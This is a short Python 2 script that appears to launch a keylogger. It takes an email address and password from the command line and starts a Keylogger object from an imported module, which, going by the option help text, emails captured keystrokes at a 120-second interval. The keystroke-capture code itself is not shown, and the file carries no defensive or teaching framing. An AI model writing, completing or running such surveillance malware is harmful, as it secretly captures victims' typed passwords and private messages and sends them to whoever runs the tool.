#! /usr/bin/python
"""A simple keylogger script.
   Uses Python 2.7.16"""

import keylogger
import optparse


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-e', '--email', dest='email', help='Email address to send responses to.')
    parser.add_option('-p', '--password', dest='password', help='Password for email account.')

    (options, arguments) = parser.parse_args()

    return options


options = get_arguments()

my_keylogger = keylogger.Keylogger(120, options.email, options.password)
my_keylogger.start()
